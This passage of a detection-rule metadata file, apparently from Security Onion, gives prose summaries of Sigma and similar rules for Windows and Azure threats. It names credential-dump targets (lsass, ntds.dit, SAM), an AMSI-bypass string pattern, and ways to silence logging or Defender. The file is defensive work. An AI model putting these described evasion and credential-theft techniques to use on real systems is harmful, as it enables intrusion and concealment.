    rule looks for specific command-line patterns indicative of the tool's operation,
    including references to the Microsoft Windows Shell ZipFolder, the presence of
    file extensions like '.zip', and parameters such as '/pass:' and '/user:'. It
    also identifies deletion activities that involve similarly structured command
    lines. The detection aims to identify the use of this tool, which could be employed
    for execution and defense evasion tactics.
  Updated-Date: '2024_09_04'
90f138c1-f578-4ac3-8c49-eecfd847c8b7:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a1f6c882889fc96832244a2c6a80b4c6
  Ruleset: core
  Summary: This rule detects a Background Intelligent Transfer Service (BITS) transfer
    job that downloads files from a direct IP address. BITS is a Windows service used
    for asynchronous file transfers between machines. Specifically, the rule triggers
    on events where the remote name in the transfer job starts with an IP address,
    excluding private network ranges and specific sources like 7-Zip's domain. This
    behavior may indicate an attempt to download malicious files or perform unauthorized
    data transfers, thus warranting close attention.
  Updated-Date: '2024_09_03'
90fb5e62-ca1f-4e22-b42e-cc521874c938:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7350ef57d2727136512d2c431909148f
  Ruleset: core
  Summary: This rule detects the spawning of suspicious shell processes from the Java
    utility `keytool.exe`. It monitors for instances where `keytool.exe` initiates
    shells or command-line tools such as `cmd.exe`, `powershell.exe`, `bash.exe`,
    `schtasks.exe`, `certutil.exe`, `whoami.exe`, and others. This can be indicative
    of exploitation attempts, such as those related to ManageEngine ADSelfService
    Plus vulnerabilities, where the `keytool` utility is leveraged to gain unauthorized
    access or maintain persistence within a system.
  Updated-Date: '2024_09_03'
91048c0d-5b81-4b85-a099-c9ee4fb87979:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8d62acd6eb979c549af5b0c5465728b9
  Ruleset: emerging-threats
  Summary: This rule detects suspicious process execution originating from AsperaFaspex,
    a file transfer software, often exploited by the Mint Sandstorm threat actor group.
    It specifically monitors for instances of AsperaFaspex spawning child processes
    such as `powershell.exe` executing potentially malicious PowerShell commands involving
    base64 encoding, downloading files, or modifying system preferences. Additionally,
    it tracks suspicious activity related to `lsass` processes, which may indicate
    attempts to extract sensitive information, as well as unexpected executions of
    utility tools like `wget.exe` and `curl.exe` for network communication. The rule
    also looks for commands indicative of user or group management modifications,
    registry changes that impact Windows Defender settings, and operations involving
    Windows Management Instrumentation (WMI) and Volume Shadow Copy Service (VSS)
    that could be part of lateral movements or data destruction activities within
    the network.
  Updated-Date: '2024_09_03'
910ab938-668b-401b-b08c-b596e80fdca5:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: a962ef43eaf8bb9c9a50a51749bc705d
  Ruleset: sigmahq
  Summary: This rule detects the transfer of files containing credential data using
    network shares on Windows systems. It specifically looks for activities involving
    well-known filenames associated with sensitive files, such as 'mimidrv,' 'lsass,'
    'windows/minidump,' 'hiberfil,' 'sqldmpr,' 'sam,' 'ntds.dit,' and 'security.'
    These files are commonly targeted for credential dumping in Windows environments.
    The rule leverages EventID 5145 to monitor for these transfers, which could indicate
    malicious activities aimed at accessing credential data. Potential false positives
    include legitimate administrative work involving the transfer of sensitive files
    by authorized administrators.
  Updated-Date: '2024_09_04'
91109523-17f0-4248-a800-f81d9e7c081d:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4cef41dd4d44ca33a9fc2da242068f8b
  Ruleset: sigmahq
  Summary: This rule detects the execution of an MSI file using PowerShell and the
    WMI Win32_Product class. It triggers when specific Script Block Text patterns
    indicative of this activity, such as "Invoke-CimMethod", "-ClassName", "Win32_Product",
    and ".msi", are found. The detection aims to identify potential defense evasion
    techniques utilizing WMI for software installation.
  Updated-Date: '2024_09_04'
911389c7-5ae3-43ea-bab3-a947ebdeb85e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4d600add68e4cc48596c5c95c050b881
  Ruleset: emerging-threats
  Summary: This rule detects specific command line executions associated with the
    cybercrime group APT FIN7. It identifies reconnaissance activities and the use
    of the POWERTRASH malware, particularly targeting Veeam servers. The detections
    focus on command line patterns that include administrative shares and the Windows
    Temp directory.
  Updated-Date: '2024_09_03'
91239011-fe3c-4b54-9f24-15c86bb65913:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0bc6b9d82569d3f366ba9a60232cc321
  Ruleset: core
  Summary: This rule detects changes in the Windows registry that indicate the "VBAWarnings"
    setting in Microsoft Office has been altered to allow the execution of all macros,
    both signed and unsigned. This change poses a significant security risk as it
    can enable various types of malware, such as Zloader, to execute malicious macros
    without user intervention, potentially leading to data breaches and system compromise.
    Detection of this registry modification is crucial for identifying attempts to
    evade defenses and execute unauthorized macros in the Office environment.
  Updated-Date: '2024_09_03'
919f2ef0-be2d-4a7a-b635-eb2b41fde044:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 05c14daff16c9a779a58644c5824799a
  Ruleset: core
  Summary: This rule detects the addition of a registry key named 'MiniNt' under `HKLM\SYSTEM\CurrentControlSet\Control`.
    When this key is added and the system is rebooted, the Windows Event Log service
    will stop writing events. This could be indicative of an attempt to disable security
    event logging as a form of defense evasion.
  Updated-Date: '2024_09_03'
91a2c315-9ee6-4052-a853-6f6a8238f90d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7711bee5bd0c321105ff62199e63fb1d
  Ruleset: core
  Summary: This rule detects attempts to search for encrypted cpassword values within
    Group Policy Preference files on a Domain Controller using tools like find.exe
    or findstr.exe. The cpassword value can be decrypted using tools like gpp-decrypt,
    representing a credential access technique. The detection is based on specific
    process creation patterns and command line arguments indicating the search for
    these values in SYSVOL directory XML files.
  Updated-Date: '2024_09_03'
91b76b84-8589-47aa-9605-c837583b82a9:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: aa43d2398a49df2c81b74ba4aa4a3eaf
  Ruleset: core
  Summary: This rule detects instances when a user may have mistakenly entered their
    password into the username field during an Okta login attempt, which would result
    in the password being logged and potentially exposed in log files. The rule specifically
    looks for failed login attempts and excludes entries that match typical Okta service
    account names or valid email address formats.
  Updated-Date: '2024_09_03'
91c49341-e2ef-40c0-ac45-49ec5c3fe26c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9c73054698fd352a59f096abdad679d3
  Ruleset: core
  Summary: This rule detects the installation of the RTCore service, which could indicate
    potential abuse of the vulnerable driver associated with Micro-Star MSI Afterburner.
    The specific event monitored is the creation or modification of a service named
    'RTCore64' by the Service Control Manager on Windows systems. This activity may
    suggest an attempt to exploit the legitimate software for malicious purposes.
  Updated-Date: '2024_09_03'
91c945bc-2ad1-4799-a591-4d00198a1215:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b5b68c06e94549f5b30bc9aa89dabe41
  Ruleset: sigmahq
  Summary: This rule detects access to known sensitive file extensions on a network
    share, specifically within a Windows environment. The targeted file extensions
    include backup (.bak), memory dump (.dmp), Exchange database (.edb), Kerberos
    tickets (.kirbi), Outlook message (.msg), Lotus Notes databases (.nsf and .nst),
    offline address books (.oab), Outlook data files (.ost and .pst), Remote Desktop
    Protocol (.rdp), and the groups.xml file. The detection is based on observing
    EventID 5145, which logs attempts to access these files. Potential false positives
    may arise from Help Desk operations or users who legitimately work with these
    file types.
  Updated-Date: '2024_09_04'
91c95675-1f27-46d0-bead-d1ae96b97cd3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 27d38ba6699c5a8db3245eaf54abd97d
  Ruleset: sigmahq
  Summary: This rule detects instances where a user is added to a group that has access
    to modify Conditional Access (CA) policies. This monitoring is essential for identifying
    potential unauthorized access and policy changes which can be components of defense
    evasion and persistence tactics in cyber attacks.
  Updated-Date: '2024_09_04'
91e69562-2426-42ce-a647-711b8152ced6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 927dd32c92ed3ef206371fa5a83b12a7
  Ruleset: core
  Summary: This rule detects the execution of AADInternals PowerShell cmdlets, which
    are used for administering Azure AD and Office 365 environments. The detection
    focuses on identifying specific cmdlet patterns such as 'Add-AADInt', 'Get-AADInt',
    and 'Install-AADInt' within script block text, as these can indicate the use of
    this tool. While AADInternals can be legitimately utilized for administrative
    tasks, it can also be exploited by threat actors to target Azure AD or Office
    365 for reconnaissance, credential access, and other malicious activities.
  Updated-Date: '2024_09_03'
91edcfb1-2529-4ac2-9ecc-7617f895c7e4:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7f83fedb9b89a8b1bee5d0b72e5b1591
  Ruleset: sigmahq
  Summary: This rule detects the usage of weak or commonly abused passwords through
    the command-line interface (CLI). Specifically, it focuses on scenarios where
    a threat actor creates a new user and sets the password inline using commands
    like 'net'. The rule identifies weak passwords such as '123456789', '123123qwE',
    'P@ssw0rd!', 'password123', and others known to be exploited by threat actors.
    This helps in identifying potential security threats where such easily guessable
    passwords are being used, which could be indicative of unauthorized access or
    malicious activities. Legitimate use of these passwords by users can cause false
    positives, though such practices should be discouraged.
  Updated-Date: '2024_09_04'
92020b88-9caf-464f-bad8-cd0fb0aa2a81:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 8be308ce13eaabe27a53d3c785fa40ca
  Ruleset: emerging-threats
  Summary: This rule detects the execution of a ".CPL" file located in the user temp
    directory via the Shell32 DLL "Control_RunDLL" export function. Such execution
    behavior has been observed in multiple variants of the Raspberry Robin malware,
    which uses these files to evade defenses and execute potentially harmful activities
    on Windows systems.
  Updated-Date: '2024_09_03'
9212f354-7775-4e28-9c9f-8f0a4544e664:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e8a00eaafe32bcc25ff26f785c4237dd
  Ruleset: sigmahq
  Summary: This rule detects the execution of Sysinternals ADExplorer with the "-snapshot"
    flag, which indicates an attempt to save a local copy of the Active Directory
    database. ADExplorer is a tool used for browsing Active Directory, and using the
    "-snapshot" flag could suggest unauthorized access or data exfiltration activities.
  Updated-Date: '2024_09_04'
923421c7-9b1e-45d4-80cc-e21d060c8723:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7483b9ee691d120f020522a6ab7da17e
  Ruleset: securityonion-resources
  Summary: This rule detects failed login attempts to a grid node via SSH on Linux
    systems. It identifies unsuccessful authentication events originating from the
    'sshd' process and specifically targets instances tagged with 'so-grid-node'.
    The rule helps in reviewing associated logs for details about the username and
    source IP causing the failed attempts, aiding in security monitoring and incident
    response.
  Updated-Date: '2024_08_07'
92389a99-5215-43b0-a09f-e334453b2ed3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 57c83ae1f41738271f86af94753b7ff0
  Ruleset: emerging-threats
  Summary: This rule detects the creation of a "Report.wer" file in an uncommon folder
    structure on Windows, which could indicate potential exploitation of CVE-2023-36874.
    The rule checks for files within the "ReportArchive" directory and specifically
    looks for uncommon paths not typically associated with standard "ReportArchive"
    folders such as AppCrash, AppHang, Critical, Kernel, or NonCritical. This could
    signal malicious activity or an emerging threat related to this CVE.
  Updated-Date: '2024_09_03'
9248c7e1-2bf3-4661-a22c-600a8040b446:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5d4c1c7e6bb76eb0995e659db47d9387
  Ruleset: core
  Summary: This rule detects the execution of Rundll32, a Windows utility, in scenarios
    where the Dynamic Link Library (DLL) being called is stored in an Alternate Data
    Stream (ADS). The rule monitors process creation logs to identify command lines
    that match patterns indicating such an execution. Specifically, it looks for instances
    where the command line features Rundll32.exe invoking a DLL within an ADS, which
    can be used for defense evasion purposes.
  Updated-Date: '2024_09_03'
9257c05b-4a4a-48e5-a670-b7b073cf401b:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: f79975aaba7232d9cc98875a2b00d1f0
  Ruleset: sigmahq
  Summary: This rule detects command-line arguments indicating the execution of a
    child process via the `dotnet-trace.exe` utility on Windows systems. `Dotnet-trace.exe`
    is a command-line tool used for collecting diagnostic information. It aims to
    identify potentially suspicious activities where this tool might be leveraged
    for unauthorized process execution, particularly focusing on the parameters `--`
    and `collect` in the command line.
  Updated-Date: '2024_09_04'
92772523-d9c1-4c93-9547-b0ca500baba3:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 42c370f68bfd47b2f3fe75fcda945019
  Ruleset: core
  Summary: This rule detects the registration of a new SIP provider via modifications
    to the Windows registry key `\SOFTWARE\Microsoft\Windows NT\CurrentVersion\Winlogon\mpnotify`.
    This behavior may indicate an attacker establishing persistence and evading defenses
    on a Windows system. Although legitimate SIP provider registrations can trigger
    this rule, such events are uncommon and should be investigated for potential security
    threats.
  Updated-Date: '2024_09_03'
9292293b-8496-4715-9db6-37028dcda4b3:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 21fae12cf062e73e17607f7bc15a0b9c
  Ruleset: sigmahq
  Summary: This rule detects the use of Replace.exe on Windows operating systems.
    Replace.exe is a command-line tool that can replace files with other files. Its
    usage may indicate suspicious activity, particularly related to command and control
    methods within a network. The detection criteria focus on the execution of Replace.exe
    with specific command-line arguments.
  Updated-Date: '2024_09_04'
92a974db-ab84-457f-9ec0-55db83d7a825:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 1081750b32dbdeefeb15c65e8dbd895c
  Ruleset: sigmahq
  Summary: This rule detects the use of special strings and null bits that may be
    employed to potentially bypass Antimalware Scan Interface (AMSI) functionalities.
    Bypassing AMSI can allow malicious code to be executed without being detected
    by antivirus or security software. By identifying commands that contain specific
    patterns such as "if(0){{{0}}}' -f $(0 -as [char]) +" or "#<NULL>", the rule aims
    to flag suspicious activities that might indicate an attempt to evade security
    mechanisms on Windows systems.
  Updated-Date: '2024_09_04'
92b0b372-a939-44ed-a11b-5136cf680e27:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5f25d98ace46516ba5079e8ea8736bdd
  Ruleset: core
  Summary: This rule detects system changes in Windows Registry specifically targeting
    the path '\CurrentControlSet\Services\wercplsupport\Parameters\ServiceDll', which
    may indicate the presence of Blue Mockingbird malware. Blue Mockingbird is known
    for deploying cryptocurrency mining software on compromised systems. The rule
    aims to identify unauthorized modifications consistent with this threat, helping
    in early detection and mitigation.
  Updated-Date: '2024_09_03'
92cc3e5d-eb57-419d-8c16-5c63f325a401:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 82d0196535c04d8e6a48bb55d16ff28c
  Ruleset: sigmahq
  Summary: This rule detects when a suppression rule is created in Microsoft Azure.
    Suppression rules can be used by adversaries to avoid detection by security monitoring
    systems. The detection leverages the operation name specific to writing suppression
    rules in Azure Security alerts. Although legitimate administrators may create
    suppression rules, any unexpected or unfamiliar creation of these rules should
    be investigated to ensure it is not an attempt at evading security measures.
  Updated-Date: '2024_09_04'
92d78c63-5a5c-4c40-9b60-463810ffb082:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 95f9caf1dde7614184a7a8f54cef57e2
  Ruleset: emerging-threats
  Summary: This rule detects attempts to exploit the OWASSRF vulnerability targeting
    Exchange servers using publicly available proof-of-concept (POC) codes. The attack
    utilizes the Outlook Web App (OWA) endpoint to gain access to the PowerShell backend
    of the server. Key indicators include specific patterns in user-agent headers
    and successful POST requests to particular URI queries associated with OWA and
    PowerShell.
  Updated-Date: '2024_09_03'
92dae1ed-1c9d-4eff-a567-33acbd95b00e:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fa069656222da58f0652d0800915de1b
  Ruleset: core
  Summary: This rule detects potential remote activity involving Impacket SecretDump,
    a tool used for Active Directory (AD) credential dumping. The detection focuses
    on network traffic monitored by Zeek related to Server Message Block (SMB) file
    activities. Specifically, it looks for paths containing backslashes and the "ADMIN$"
    share, with file names that include "SYSTEM32\" and end with a ".tmp" extension.
    This behavior can indicate unauthorized attempts to extract AD credentials.
  Updated-Date: '2024_09_03'
92fa78e7-4d39-45f1-91a3-8b23f3f1088d:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 540ea4e443fb32065d935ebd011aeb0c
  Ruleset: core
  Summary: This rule detects instances where PowerShell is used to create startup
    shortcuts. Adversaries may employ this method to write malicious .lnk files into
    the startup directory to ensure their malware persists on a system. Specifically,
    in the context of the Yellow Cockatoo malware, this technique eventually leads
    to the execution of a command-line script that installs a malicious DLL. The detection
    hinges on identifying the creation of .lnk files within the startup directory
    by PowerShell, which can indicate a persistence mechanism used by multiple threats.
  Updated-Date: '2024_09_03'
9313dc13-d04c-46d8-af4a-a930cc55d93b:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 250d9aa605794add1c6e4554d5f3fe7f
  Ruleset: core
  Summary: This rule detects the loading of a dynamic link library (DLL) by the VMware
    Xfer utility from a non-default directory, which may indicate an attempt to sideload
    arbitrary DLLs. This activity is associated with attempts to evade defenses, as
    seen in certain ransomware operations that misuse legitimate utilities to load
    malicious code.
  Updated-Date: '2024_09_03'
93199800-b52a-4dec-b762-75212c196542:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 0acbdd3cfcaeaa43955e3598862a3d67
  Ruleset: core
  Summary: This rule detects the use of the RunXCmd tool to execute commands with
    System or TrustedInstaller accounts on Windows operating systems. The RunXCmd
    tool allows users to run programs with elevated privileges, potentially bypassing
    standard security controls. The detection focuses on identifying specific command
    line patterns associated with the tool, indicating an attempt to execute commands
    under elevated accounts. This activity is typically flagged due to its potential
    use in malicious operations, although legitimate administrative use may also trigger
    the rule.
  Updated-Date: '2024_09_03'
931b6802-d6a6-4267-9ffa-526f57f22aaf:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3b7da4584bd1dda1cbd9e16c30dfc405
  Ruleset: emerging-threats
  Summary: This rule detects potential exploitation of the BearLPE exploit, which
    leverages Task Scheduler's ".job" import for arbitrary Discretionary Access Control
    List (DACL) writes. The detection focuses on the process creation logs in Windows,
    specifically instances where "schtasks.exe" is executed with command-line arguments
    that include '/change', '/TN', '/RU', and '/RP'. This combination of command-line
    parameters is indicative of suspicious activity related to privilege escalation
    exploits.
  Updated-Date: '2024_09_03'
932ac737-33ca-4afd-9869-0d48b391fcc9:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4a04e93d03104e9c7b1c34466f26a438
  Ruleset: emerging-threats
  Summary: This rule detects Command and Control (C2) traffic associated with the
    Ursnif malware, which is known for stealing financial information and delivering
    additional malware. It identifies encoded URLs containing specific patterns such
    as '_2f' and '_2b', and URLs that simultaneously include '.avi' and '/images/'.
  Updated-Date: '2024_09_03'
932fb0d8-692b-4b0f-a26e-5643a50fe7d6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 9b962585196cd53fa5c1b3d3da4a90e8
  Ruleset: sigmahq
  Summary: This rule detects attempts to capture audio using PowerShell Cmdlets on
    Windows systems. It monitors process creation logs for specific command line arguments
    associated with audio device manipulation, such as 'WindowsAudioDevice-Powershell-Cmdlet,'
    'Toggle-AudioDevice,' 'Get-AudioDevice,' 'Set-AudioDevice,' and 'Write-AudioDevice.'
    The presence of these commands may indicate malicious activity involving unauthorized
    audio recording, although it can also be triggered by legitimate audio capture
    operations performed by authorized users.
  Updated-Date: '2024_09_04'
93671f99-04eb-4ab4-a161-70d446a84003:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: daefdbcc2e2555dd24e64fbdedc1fee7
  Ruleset: sigmahq
  Summary: This rule detects the use of Rpcping.exe to send an RPC test connection
    to a target server, ensuring that the NTLM hash is sent during the process. Rpcping.exe
    is often used in testing RPC (Remote Procedure Call) connections, but this detection
    focuses on identifying when it is specifically used to force NTLM authentication.
    This can be a potential indicator of credential capturing attempts to gain unauthorized
    access by exploiting NTLM hashes.
  Updated-Date: '2024_09_04'
9386d78a-7207-4048-9c9f-a93a7c2d1c05:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 7f7afc93efd3db2a343d91b24e9e3472
  Ruleset: sigmahq
  Summary: This rule detects the launch of an executable by utilizing the LaunchApplication
    function from the pcwutl.dll library. The specific indicator involves identifying
    processes that are initiated by 'rundll32.exe' and observing command lines that
    contain both 'pcwutl' and 'LaunchApplication'. This can be indicative of defense
    evasion tactics as part of malware activities exploiting this dynamic link library
    for unauthorized code execution.
  Updated-Date: '2024_09_04'
93a19907-d4f9-4deb-9f91-aac4692776a6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 3d7bae31988a38730f42c387d18c7d69
  Ruleset: core
  Summary: This rule detects an attempt to bypass User Account Control (UAC) by using
    a .NET Code Profiler technique combined with DLL hijacking via `mmc.exe`. The
    specific pattern involves the creation or manipulation of a DLL file named `pe386.dll`
    within the temporary directory of a user's profile in the AppData\Local\Temp folder.
    This method is associated with UACMe, a known tool used to exploit UAC vulnerabilities.
  Updated-Date: '2024_09_03'
93bbde78-dc86-4e73-9ffc-ff8a384ca89c:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 60c032c98bf9b13ec66a106cd8847d85
  Ruleset: emerging-threats
  Summary: This rule detects the execution of a potentially compromised version of
    the 3CXDesktopApp, a desktop VoIP application. It identifies specific file hashes
    (SHA256, SHA1, and MD5) and file characteristics associated with known compromised
    versions of the software, specifically versions 18.12.407 and 18.12.416. The rule
    focuses on process creation events in Windows, checking for original file names,
    file paths, product names, and file versions that match those of the compromised
    application. The detection criteria target indicators of compromise to flag potential
    malicious activity while acknowledging that legitimate use of the 3CXDesktopApp
    could be a false positive.
  Updated-Date: '2024_09_03'
93d298a1-d28f-47f1-a468-d971e7796679:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b2acb300fae91261b06a99370ec4db81
  Ruleset: sigmahq
  Summary: This rule detects attempts to disable the Tamper Protection feature in
    Windows Defender. Tamper Protection is a security feature designed to prevent
    unauthorized changes to Windows Defender settings. The rule monitors changes to
    a specific registry key associated with Tamper Protection, where setting a DWORD
    value to 0 indicates that the protection has been turned off. It includes filters
    to exclude legitimate cases during updates by Windows Defender components.
  Updated-Date: '2024_09_04'
93d5f1b4-36df-45ed-8680-f66f242b8415:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 42943700b94cfa40bea56d51a040e257
  Ruleset: emerging-threats
  Summary: This rule detects the creation of ".xml" and ".txt" files in the "\AppData\Roaming\Microsoft"
    directory by uncommon processes such as "schtasks.exe," "wscript.exe," and "mshta.exe."
    This behavior is associated with different stages and samples of Devil Bait, a
    malicious campaign analyzed by the NCSC, indicating potential malicious activities
    aimed at defense evasion or emerging threats.
  Updated-Date: '2024_09_03'
93d94efc-d7ad-4161-ad7d-1638c4f908d8:
  Created-Date: '2024_08_06'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 50a62b3762d8c49c8618e77f04624903
  Ruleset: core
  Summary: This rule detects the creation of a default dump file named 'dumpert.dmp'
    used by the Outflank Dumpert tool, which is a process dumper designed to dump
    the memory of the lsass process. The detection of such a dump file is significant
    because it can indicate attempts at credential access on Windows systems.
  Updated-Date: '2024_09_03'
941e5c45-cda7-4864-8cea-bbb7458d194a:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4ef0703269383faa7b40227edbc8526d
  Ruleset: sigmahq
  Summary: This rule detects suspicious processes logging on with explicit credentials
    on a Windows system. Specifically, it looks for events where commands such as
    'cmd.exe', 'powershell.exe', 'pwsh.exe', 'winrs.exe', 'wmic.exe', 'net.exe', 'net1.exe',
    or 'reg.exe' are executed, triggering EventID 4648. The rule excludes cases where
    the TargetServerName is 'localhost' or when both SubjectUserName and TargetUserName
    end with a dollar sign ('$'). This helps identify potential lateral movement activities
    or unauthorized access attempts.
  Updated-Date: '2024_09_04'
944e8941-f6f6-4ee8-ac05-1c224e923c0e:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 4ef2edc74649c20eabec0ca6e3feef51
  Ruleset: sigmahq
  Summary: This rule detects the use of port monitors by adversaries to achieve persistence
    or privilege escalation on a Windows system. The technique involves setting a
    port monitor through the AddMonitor API call, which allows a specified DLL to
    be loaded at system startup. The rule monitors for specific registry changes where
    port monitors are configured to identify if DLL files, especially those not associated
    with known legitimate applications like CutePDF or VNC, are being used in a suspicious
    manner. This detection helps in identifying potentially malicious activities aiming
    to maintain persistence on the compromised system.
  Updated-Date: '2024_09_04'
944f6adb-7a99-4c69-80c1-b712579e93e6:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: b1070c5651fe546c0b10ead8a4ef6f95
  Ruleset: core
  Summary: This rule detects anomalous activities by identifying suspicious sign-in
    actions occurring across multiple tenants from different countries within the
    same browser. It signals potential security risks, including unauthorized access,
    persistence threats, defense evasion, privilege escalation, and initial access
    attempts, using Azure's risk detection service.
  Updated-Date: '2024_09_03'
9465ddf4-f9e4-4ebd-8d98-702df3a93239:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 6c5641bd16bf90bce19a7724d77cfcff
  Ruleset: sigmahq
  Summary: This rule detects suspicious installations of IIS native-code modules via
    the command line. IIS (Internet Information Services) is a flexible, secure, and
    manageable web server for hosting websites, services, and applications. The detection
    focuses on the execution of the `appcmd.exe` utility, which is commonly used to
    manage IIS installations, along with command line arguments that include keywords
    such as "install" and "module" as well as the presence of an optional module name.
    The rule filters out actions performed by the legitimate IIS setup process to
    reduce false positives. This may help in identifying potential security threats,
    like unauthorized backdoor installations, indicating malicious activity on web
    servers.
  Updated-Date: '2024_09_04'
94771a71-ba41-4b6e-a757-b531372eaab6:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 27199e80d498fed23b1fb4858afe2f81
  Ruleset: sigmahq
  Summary: This rule detects the execution of a browser process such as Brave, Chrome,
    Edge, Opera, or Vivaldi with an argument that includes a URL pointing to a file
    with specific extensions like .7z, .dat, .dll, .exe, .hta, .ps1, .psm1, .txt,
    .vbe, .vbs, or .zip. This behavior can be leveraged to download arbitrary files
    or obscure actions from the user, for instance, by launching the browser in a
    minimized state.
  Updated-Date: '2024_09_04'
948a0953-f287-4806-bbcb-3b2e396df89f:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 2ef06af3ea3e3dfaecef91c4f0c11328
  Ruleset: core
  Summary: This rule detects the DLL sideloading of an unsigned "mfdetours.dll". The
    execution of "mftrace.exe" can be leveraged to attach to an arbitrary process
    and forcibly load any DLL named "mfdetours.dll" from the execution's current directory.
    This activity can be indicative of attempts to evade defenses or escalate privileges.
  Updated-Date: '2024_09_03'
9494bff8-959f-4440-bbce-fb87a208d517:
  Created-Date: '2024_08_07'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: e1e3dcba432be7babb8a2e95a400479d
  Ruleset: core
  Summary: This rule detects changes to the device registration policy in Azure audit
    logs, focusing on activities where the category is "Policy" and the activity display
    name is "Set device registration policies." These modifications can indicate potential
    defense evasion or privilege escalation activities.
  Updated-Date: '2024_09_03'
949f1ffb-6e85-4f00-ae1e-c3c5b190d605:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 5e084d47d65f12444e5edd0e5c0d8683
  Ruleset: sigmahq
  Summary: This rule detects a command line process that leverages `explorer.exe`
    to execute arbitrary commands or binaries, effectively breaking the typical process
    tree and establishing its parent as a new instance of explorer originating from
    `svchost`. This behavior mirrors the `cmd.exe /c` functionality but introduces
    a layer of obfuscation by altering the process ancestry, making it harder to trace
    the executing process. By monitoring for specific command line flags and patterns
    associated with `explorer.exe`, the rule aims to identify this evasive technique.
    Potential false positives for this detection are unknown.
  Updated-Date: '2024_09_04'
94a66f46-5b64-46ce-80b2-75dcbe627cc0:
  Created-Date: '2024_09_03'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: 81127c3dc2be53b725cb057510d6a659
  Ruleset: core
  Summary: This rule detects when a privileged role in Azure Privileged Identity Management
    (PIM) is activated without requiring multi-factor authentication (MFA). This absence
    of MFA for role activation poses a significant security risk, as it can facilitate
    unauthorized access and privilege escalation. The rule identifies incidents specifically
    flagged by Azure PIM under the risk event type 'noMfaOnRoleActivationAlertIncident'.
  Updated-Date: '2024_09_03'
94dc4390-6b7c-4784-8ffc-335334404650:
  Created-Date: '2024_09_04'
  Custom-Edited: false
  Reviewed: false
  Rule-Body-Hash: fd2d52a4cc927df01d81eb097369e261
  Ruleset: sigmahq
  Summary: This rule detects potential abuse of the ntdsutil utility to dump the ntds.dit
    database to suspicious locations on a Windows system. It triggers when a new database
